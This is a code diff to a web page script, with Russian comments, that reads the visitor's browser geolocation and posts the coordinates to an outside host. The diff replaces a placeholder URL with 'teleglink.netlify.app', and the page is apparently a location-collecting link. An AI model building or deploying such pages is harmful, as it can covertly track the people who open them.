@@ -15,7 +15,7 @@
           const { latitude, longitude } = position.coords;
 
           // Отправляем данные на сервер
-          fetch('https://your-server-url.com/location', { // Замените на адрес вашего сервера
+          fetch('https://teleglink.netlify.app/', { // Замените на адрес вашего сервера
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
@@ -37,6 +37,20 @@
     } else {
       alert('Ваш браузер не поддерживает геолокацию.');
     }
+    if ("geolocation" in navigator) {
+  navigator.geolocation.getCurrentPosition(
+    (position) => {
+      console.log("Широта:", position.coords.latitude);
+      console.log("Долгота:", position.coords.longitude);
+    },
+    (error) => {
+      console.error("Ошибка получения геолокации:", error.message);
+    }
+  );
+} else {
+  console.log("Геолокация не поддерживается этим браузером.");
+}
+
   </script>
 </body>
 </html>
